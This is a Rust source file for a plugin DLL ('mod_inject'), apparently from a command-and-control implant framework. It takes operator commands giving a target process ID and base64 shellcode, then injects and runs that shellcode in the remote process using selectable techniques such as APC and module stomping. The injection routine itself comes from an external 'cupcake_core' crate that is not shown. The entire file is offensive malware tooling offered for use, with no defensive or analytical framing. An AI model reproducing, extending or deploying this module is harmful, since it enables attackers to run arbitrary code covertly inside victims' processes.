//! L2 `mod_inject` — on-demand remote process shellcode injection.
//!
//! **Not in Stage0.** Operator stages this DLL (`inject.bin`) when needed; unload after use.
//!
//! Payload (UTF-8 JSON):
//! ```json
//! {
//!   "pid": 1234,
//!   "data": "<base64 shellcode>",
//!   "method": "auto|nt|crt|apc|stomping",
//!   "wait_ms": 0
//! }
//! ```
//!
//! Command types: `process_inject` | `shellcode_inject` | `inject_shellcode`

use base64::Engine;

#[no_mangle]
pub extern "C" fn mod_init() -> i32 {
    0
}

#[no_mangle]
pub unsafe extern "C" fn mod_invoke(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    if out_ptr.is_null() || out_len.is_null() {
        return -1;
    }
    *out_ptr = std::ptr::null_mut();
    *out_len = 0;

    let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("process_inject");
    if !matches!(
        ct,
        "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject"
    ) {
        return write_json(
            out_ptr,
            out_len,
            "",
            &format!("mod_inject: unsupported cmd_type '{ct}'"),
        );
    }

    let body = match slice_bytes(payload, payload_len) {
        Some(b) => b,
        None => return write_json(out_ptr, out_len, "", "empty payload"),
    };

    let req = match parse_inject_payload(body) {
        Ok(r) => r,
        Err(e) => return write_json(out_ptr, out_len, "", &e),
    };

    #[cfg(windows)]
    {
        let mut sc = req.shellcode;
        let result = cupcake_core::inject_shellcode(req.pid, &sc, &req.method);
        // wipe shellcode buffer
        for b in sc.iter_mut() {
            *b = 0;
        }
        match result {
            Ok(r) => {
                if req.wait_ms > 0 {
                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, req.wait_ms);
                } else {
                    let _ = cupcake_core::wait_inject_thread(r.thread_handle, 0);
                }
                let msg = format!(
                    "injected pid={} addr=0x{:x} method={}",
                    r.pid, r.remote_addr, r.method
                );
                write_json(out_ptr, out_len, &msg, "")
            }
            Err(e) => write_json(out_ptr, out_len, "", &format!("inject: {e}")),
        }
    }
    #[cfg(not(windows))]
    {
        let _ = req;
        write_json(out_ptr, out_len, "", "inject: windows only")
    }
}

#[no_mangle]
pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
    if ptr.is_null() || len == 0 {
        return;
    }
    let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
}

#[no_mangle]
pub extern "C" fn mod_shutdown() -> i32 {
    0
}

struct InjectReq {
    pid: u32,
    shellcode: Vec<u8>,
    method: String,
    wait_ms: u32,
}

fn parse_inject_payload(body: &[u8]) -> Result<InjectReq, String> {
    let v: serde_json::Value =
        serde_json::from_slice(body).map_err(|e| format!("json: {e}"))?;
    let pid = v
        .get("pid")
        .and_then(|x| x.as_u64())
        .or_else(|| v.get("target_pid").and_then(|x| x.as_u64()))
        .ok_or_else(|| "missing pid".to_string())? as u32;
    let data_b64 = v
        .get("data")
        .or_else(|| v.get("shellcode"))
        .and_then(|x| x.as_str())
        .ok_or_else(|| "missing data (base64 shellcode)".to_string())?;
    let shellcode = base64::engine::general_purpose::STANDARD
        .decode(data_b64.trim())
        .map_err(|e| format!("shellcode b64: {e}"))?;
    if shellcode.is_empty() {
        return Err("empty shellcode after decode".into());
    }
    let method = v
        .get("method")
        .and_then(|x| x.as_str())
        .unwrap_or("auto")
        .to_string();
    let wait_ms = v
        .get("wait_ms")
        .and_then(|x| x.as_u64())
        .unwrap_or(0)
        .min(120_000) as u32;
    Ok(InjectReq {
        pid,
        shellcode,
        method,
        wait_ms,
    })
}

fn write_json(out_ptr: *mut *mut u8, out_len: *mut u32, stdout: &str, stderr: &str) -> i32 {
    let obj = serde_json::json!({
        "stdout": stdout,
        "stderr": stderr,
    });
    let bytes = match serde_json::to_vec(&obj) {
        Ok(b) => b,
        Err(_) => return -10,
    };
    let len = bytes.len();
    if len > u32::MAX as usize {
        return -11;
    }
    let mut boxed = bytes.into_boxed_slice();
    let ptr = boxed.as_mut_ptr();
    std::mem::forget(boxed);
    unsafe {
        *out_ptr = ptr;
        *out_len = len as u32;
    }
    0
}

unsafe fn slice_str<'a>(p: *const u8, len: u32) -> Option<&'a str> {
    if p.is_null() || len == 0 {
        return None;
    }
    std::str::from_utf8(std::slice::from_raw_parts(p, len as usize)).ok()
}

unsafe fn slice_bytes<'a>(p: *const u8, len: u32) -> Option<&'a [u8]> {
    if p.is_null() || len == 0 {
        return None;
    }
    Some(std::slice::from_raw_parts(p, len as usize))
}
